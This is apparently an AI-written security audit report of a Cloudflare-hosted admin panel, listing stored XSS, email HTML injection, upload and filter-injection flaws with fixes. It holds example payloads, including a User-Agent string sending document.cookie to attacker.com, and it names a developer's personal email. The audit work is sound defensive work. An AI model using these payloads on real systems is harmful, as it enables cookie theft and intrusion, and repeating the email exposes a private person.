{% raw %}
# Security Vulnerability Review — CF-Admin Madagascar
**Date:** 2026-05-24  
**Reviewer:** Claude (automated deep scan)  
**Branch:** `claude/codebase-vulnerability-review-hGcXw`  
**Scope:** Full codebase — API routes, auth, sessions, CSP, file upload, DB queries, audit pipeline, CI/CD

---

## Executive Summary

The codebase demonstrates a strong security posture overall — Cloudflare Zero Trust JWT verification is correctly implemented, CSRF protection is stateless and fail-closed, RBAC hierarchy is properly enforced, and parameterized queries prevent SQL injection across all D1/Supabase paths. However, **seven exploitable vulnerabilities** were identified ranging from Critical to Medium severity, all of which have been patched in this review branch.

---

## Findings

### 🔴 CRITICAL — Stored XSS via Audit Log Viewer

**File:** `src/components/admin/logs/shared.tsx:134–155`  
**CVSSv3 Estimate:** 8.4 (High) — Admin-to-admin stored XSS

**Description:**  
The `JSONViewer` component calls `JSON.stringify(data)` then applies a regex-based syntax highlighter that wraps token matches with `<span>` tags, and passes the result to `dangerouslySetInnerHTML`. **`JSON.stringify` does NOT HTML-escape `<`, `>`, or `&`**, so if the JSON data contains HTML characters, they are rendered as literal HTML.

The audit log middleware records the full URL pathname on every page navigation:
```ts
JSON.stringify({ path: pathname, granted: hasAccess, rid: requestId })
```

An authenticated admin navigating to a crafted URL path (e.g., `/dashboard/<img src=x onerror=alert(document.cookie)>`) would store that payload in D1. Any admin later viewing the Activity Stream tab in the Audit Log would execute the injected script.

**Impact:** Session cookie theft (if `HttpOnly` is ever bypassed), privilege escalation within the admin panel, phishing links in admin UI.

**Fix applied:** `syntaxHighlighted` now runs through an `escapeHtml()` pass before `<span>` insertion. The escaper is intentionally placed *after* `JSON.stringify` (so it operates on the serialized representation, not raw JS objects) and *before* the regex replacement (so the `<span class="...">` tags added by the highlighter are not double-escaped).

---

### 🔴 HIGH — HTML Injection in Security Alert Emails

**File:** `src/lib/auth/security-logging.ts:293`  
**CVSSv3 Estimate:** 6.5 (Medium) — Unauthenticated, no code execution but phishing-viable

**Description:**  
The `buildSecurityAlertHtml()` function interpolates `data.userAgent`, `data.geoLocation`, `data.email`, `data.cfIdentityProvider`, and `data.failureReason` directly into an HTML string without HTML-entity escaping. The `User-Agent` header is fully attacker-controlled (truncated to 512 chars server-side but not escaped).

An unauthenticated attacker can trigger a security alert email by attempting to log in via CF Access with a crafted `User-Agent` header. Example payload:
```
</div><img src="https://attacker.com/pixel?c=${document.cookie}" style="display:none">
```

While modern email clients block script execution, HTML injection enables:
- **Phishing forms** embedded in the alert email
- **External image requests** for open-redirect tracking / email-open confirmation
- **Visual spoofing** of the email body (impersonation)

**Fix applied:** Added `escHtml()` utility function and applied it to all five user-controlled fields before template interpolation.

---

### 🔴 HIGH — File Upload MIME Type Not Validated by Magic Bytes

**File:** `src/lib/cms.ts:103–105`, `src/pages/api/media/upload.ts:70`  
**CVSSv3 Estimate:** 5.4 (Medium) — Requires admin authentication

**Description:**  
The upload endpoint validates `file.type` (the MIME type from the `Content-Type` header of the multipart form part) against an allowlist of image types. This header is fully **client-controlled** — any HTTP client can send `Content-Type: image/jpeg` while the file body contains an HTML page, SVG with `<script>`, or polyglot payload.

The file is then stored in R2 with `contentType: file.type` (the client-supplied value). While browsers respect content-type for images, SVG files with `<script>` tags would execute JavaScript when opened directly from the CDN URL.

**Fix applied:** Added a magic-byte validation function (`validateImageMagicBytes`) that reads the first 12 bytes of the uploaded file and compares against known JPEG (`FFD8FF`), PNG (`89504E47`), WebP (`52494646...57454250`), and AVIF (`...66747970`) signatures. Uploads are rejected if the declared MIME type doesn't match the actual file content.

---

### 🟠 MEDIUM — PostgREST Filter Injection via Booking Search

**File:** `src/pages/api/bookings/index.ts:51`  
**CVSSv3 Estimate:** 4.3 (Medium) — Requires admin authentication

**Description:**  
The `search` query parameter is interpolated directly into a PostgREST `.or()` filter string:
```ts
query = query.or(`owner_name.ilike.%${search}%,owner_email.ilike.%${search}%,booking_ref.ilike.%${search}%`);
```

PostgREST parses filter strings server-side. A crafted `search` value like `%,status.eq.cancelled` would add a fourth OR condition `status.eq.cancelled` to the filter, potentially causing unintended filter behavior. While the attacker must already be an authenticated admin (limiting impact), filter injection can cause data enumeration beyond intended scopes or trigger PostgREST parser errors that leak schema information.

**Fix applied:** Strip all PostgREST operator characters (`,`, `.`, `(`, `)`, `:`) from the search string before interpolation. A clean alphanumeric-plus-spaces filter is applied via `sanitizeSearchTerm()`.

---

### 🟠 MEDIUM — Supabase Filter Injection via `userId` in Force-Kick

**File:** `src/pages/api/users/force-kick.ts:32`  
**CVSSv3 Estimate:** 4.0 — Requires super_admin role

**Description:**  
The ghost-protection query uses `.or()` with a string-interpolated user ID:
```ts
.or(`id.eq.${userId}`)
```

The `userId` comes from the request body with only a null-check. The correct pattern for single-field equality is `.eq('id', userId)`, which lets the Supabase client handle escaping. Using `.or()` with raw string interpolation is a filter injection vector.

**Fix applied:** Changed to `.eq('id', userId)`.

---

### 🟠 MEDIUM — Session Cookie `SameSite: 'lax'` (Should Be `'strict'`)

**File:** `src/lib/auth/session.ts:147, 237`  
**CVSSv3 Estimate:** 3.7 (Low-Medium)

**Description:**  
The admin session cookie is configured with `sameSite: 'lax'`. The `Lax` policy allows the cookie to be sent on **cross-site top-level navigation** (e.g., following a link from an external page). While CSRF mutations are already protected by the Origin/Referer validator, `Strict` is the correct setting for an admin portal — the cookie should never accompany cross-origin navigation.

**Fix applied:** Changed `sameSite: 'lax'` to `sameSite: 'strict'` on both `createSession` and `destroySession` cookie operations. This has no UX impact: all admin links are same-origin navigations.

---

### 🟠 MEDIUM — `patchSession` Silently Resets KV TTL to Full Lifetime

**File:** `src/lib/auth/session.ts:187`  
**CVSSv3 Estimate:** 2.5 (Low) — Mitigated by application-level hard-expiry check

**Description:**  
When `patchSession` writes an updated session back to KV, it always uses `expirationTtl: Math.floor(maxLifetime / 1000)` (24 hours from *now*). This inadvertently resets the KV expiry on every 30-minute role-recheck, meaning the KV entry will always have a TTL of ~24h regardless of the session's actual remaining lifetime.

While the application-level `createdAt` check in `getSession` correctly enforces the 24-hour hard expiry, the KV store retains session data longer than necessary. A session created at T=0 and patched at T=23h would expire in KV at T=47h, even though it's rejected at the application level at T=24h.

**Fix applied:** Compute remaining TTL from `session.createdAt` before writing:
```ts
const remainingMs = maxLifetime - (Date.now() - session.createdAt);
expirationTtl: Math.max(60, Math.floor(remainingMs / 1000))
```
Minimum 60-second floor prevents zero/negative TTLs from causing KV write errors.

---

## Additional Findings (Low Severity — Documented, Not Patched)

### 🟡 LOW — Theme Cookie Missing `Secure` Attribute

**File:** `src/pages/api/settings/user.ts:157`  
The `cf_admin_theme` cookie is set via raw `Set-Cookie` header string without a `Secure;` attribute. In production (HTTPS only), this is fine, but it should be explicit. The cookie holds only a UI preference value (no security impact), but the pattern should be consistent.

**Recommendation:** Add `Secure;` to the Set-Cookie string, or switch to `ctx.cookies.set()` which uses `secure: import.meta.env.PROD` automatically.

---

### 🟡 LOW — Infrastructure IDs + Developer Email in `wrangler.toml`

**File:** `wrangler.toml`  
The following are committed to git in `[vars]`:
- `CF_ACCESS_AUD` — CF Zero Trust audience tag (not a secret, but aids JWT forgery research)
- `CF_ACCOUNT_ID`, `CF_D1_DATABASE_ID`, `CF_R2_BUCKET_NAME`, KV namespace `id` — infrastructure identifiers
- `LOCAL_DEV_ADMIN_EMAIL = "harshil.8136@gmail.com"` — developer's personal email

Per Cloudflare's own guidance, CF_ACCESS_AUD is not a secret (it's a public application identifier), and infrastructure IDs in wrangler.toml are expected for deployment configuration. However, the developer email should be moved to `.dev.vars` (already gitignored) rather than committed.

**Recommendation:** Move `LOCAL_DEV_ADMIN_EMAIL` to `.dev.vars` only. Remove it from `wrangler.toml [vars]`.

---

### 🟡 LOW — Security Documentation Synced to Public Repository

**File:** `.github/workflows/sync-docs.yml`  
The workflow syncs `documentation/**` (including `SECURITY.md` and `ARCHITECTURE.md`) to a public GitHub repository (`Harshil8136/chess-game1`). These files document:
- The complete auth bypass sequence
- Session structure and KV key patterns
- Rate limit thresholds and their identifiers
- Admin email addresses

Detailed security architecture documentation in a public repo reduces the research effort required for targeted attacks.

**Recommendation:** Exclude security-sensitive documentation from the public sync (e.g., exclude `documentation/SECURITY.md`, `documentation/ARCHITECTURE.md`, `documentation/login-forensics.md`).

---

### 🟡 LOW — SECURITY.md References Removed `isBreakGlassAdmin` Code

**File:** `documentation/SECURITY.md:section 1.2`  
The documentation mentions `BREAK_GLASS_EMAILS`, `isBreakGlassAdmin()`, and `isHardcodedSuperAdmin()` with specific email addresses. **This code no longer exists in `src/lib/auth/rbac.ts`.** The break-glass mechanism was removed but the docs weren't updated.

This creates confusion for future security reviewers — they may spend time searching for code that doesn't exist, or believe the system has a hardcoded bypass when it doesn't.

**Recommendation:** Remove the break-glass section from `SECURITY.md` and add a note that it was intentionally removed in vX.Y.

---

### 🟡 LOW — Content-Security-Policy Uses `unsafe-inline` + `unsafe-eval`

**File:** `src/middleware.ts:458`  
The CSP script-src directive includes both `'unsafe-inline'` and `'unsafe-eval'`, which essentially negates XSS protection for injected scripts. These directives are required because of Astro's client-side hydration and Sentry's error tracking.

**Recommendation:** Long-term, migrate to nonce-based CSP by integrating Astro's built-in nonce injection (available since Astro 4.x). Short-term, consider removing `'unsafe-eval'` if Sentry can be configured to not use `eval`. This is a larger refactor and out of scope for this review.

---

### 🟡 LOW — No Rate Limiting on Logout Endpoint

**File:** `src/pages/api/auth/logout.ts`  
The logout endpoint performs a KV delete + audit log write on every call. With no rate limit, a rapid series of logout calls could cause unnecessary KV/D1 load. Given that logout is user-initiated and destroys the session (rendering subsequent calls no-ops), the practical impact is minimal.

**Recommendation:** Add a lightweight rate limit of 10/minute per IP.

---

## Positive Security Findings

The following security controls were verified to be correctly implemented:

| Control | Implementation | Assessment |
|---------|----------------|------------|
| CF Zero Trust JWT verification | RS256, JWKS cache, aud/exp/iat checks | ✅ Correct |
| Session hard expiry | `createdAt` check on every read | ✅ Correct |
| Role freshness recheck | 30-min D1 recheck with fail-open for availability | ✅ Correct design |
| CSRF protection | Origin+Referer validation, fail-closed | ✅ Correct |
| RBAC hierarchy | Numeric role levels, lower = higher privilege, enforced at API + middleware | ✅ Correct |
| PLAC access control | Deny-wins resolution, KV-cached, recomputed on change | ✅ Correct |
| 3-layer force-kick | KV delete + revocation flag + CF API | ✅ Correct |
| D1 parameterized queries | All D1 queries use `prepare().bind()` — no string interpolation | ✅ Correct |
| Ghost protection | DEV/Owner invisible to lower-tier actors | ✅ Correct |
| Audit logging | All mutations logged via Ghost Audit Engine | ✅ Correct |
| Session cookie `__Host-` prefix | Production only, correct implementation | ✅ Correct |
| HSTS, X-Frame-Options, nosniff | Applied via middleware `securityHeaders` | ✅ Correct |
| Rate limiting | Upstash Redis sliding-window on all sensitive endpoints | ✅ Correct |
| `.dev.vars` gitignored | Verified in `.gitignore` | ✅ Correct |
| Supabase service role server-side only | Never passed to client, no anon key | ✅ Correct |

---

## Patches Applied in This Review

| # | File | Change |
|---|------|--------|
| 1 | `src/components/admin/logs/shared.tsx` | Added `escapeHtml()` before `dangerouslySetInnerHTML` — fixes Stored XSS |
| 2 | `src/lib/auth/security-logging.ts` | Added `escHtml()` helper and applied to all user-controlled email fields |
| 3 | `src/lib/cms.ts` | Added `validateImageMagicBytes()` for magic-byte MIME validation |
| 4 | `src/pages/api/bookings/index.ts` | Added `sanitizeSearchTerm()` to strip PostgREST operator chars |
| 5 | `src/pages/api/users/force-kick.ts` | Changed `.or(`id.eq.${userId}`)` → `.eq('id', userId)` |
| 6 | `src/lib/auth/session.ts` | Changed `sameSite: 'lax'` → `sameSite: 'strict'`; fixed KV TTL to use remaining lifetime |

{% endraw %}
